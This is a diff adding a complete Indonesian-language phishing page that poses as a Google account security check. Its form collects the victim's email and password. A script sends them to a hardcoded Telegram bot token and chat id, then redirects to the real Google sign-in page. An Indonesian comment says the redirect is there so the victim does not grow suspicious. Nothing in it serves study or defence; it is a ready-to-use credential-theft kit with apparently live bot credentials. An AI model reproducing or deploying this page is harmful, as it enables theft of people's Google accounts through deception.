@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keamanan Akun Google</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f1f1f1; }
+        .box { background: white; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 350px; text-align: center; }
+        img { width: 75px; margin-bottom: 10px; }
+        h2 { font-size: 24px; margin-bottom: 10px; font-weight: 400; }
+        p { margin-bottom: 25px; font-size: 15px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; width: 100%; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+        <h2>Verifikasi Identitas</h2>
+        <p>Gunakan Akun Google Anda</p>
+        <form id="pancing">
+            <input type="email" id="email" placeholder="Email atau ponsel" required>
+            <input type="password" id="pass" placeholder="Masukkan sandi Anda" required>
+            <button type="submit">Amankan Akun</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('pancing').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            
+            // DATA TUAN DARI GAMBAR
+            const token = '8469370025:AAHP58nPm9mKa_uBWE0nhcCAPWffeipjbl8'; 
+            const id = '6119659517';
+            const info = `🎯 TARGET TEMBUS!\n\n📧 Email: ${email}\n🔑 Sandi: ${pass}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(info)}`)
+            .then(() => {
+                // Lempar ke halaman login asli agar tidak curiga
+                window.location.href = 'https://accounts.google.com/signin';
+            });
+        });
+    </script>
+</body>
+  </html>
+  
